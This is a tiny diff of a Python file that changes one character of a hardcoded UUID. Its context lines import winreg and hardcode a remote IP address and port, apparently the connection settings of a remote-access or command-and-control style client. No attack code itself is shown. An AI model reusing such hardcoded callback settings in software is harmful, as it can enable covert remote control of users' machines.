@@ -9,7 +9,7 @@ from signal import SIGTERM
 from random import randint, uniform
 import winreg
 
-UUID = "ea4iFScQxHoSYMnztWhFyhVNOe5oZgeT"
+UUID = "ea4iFScQxHoScYMnztWhFyhVNOe5oZgeT"
 remote_ip = '134.209.206.142'
 remote_port = 8081
 server_sni_hostname = ''
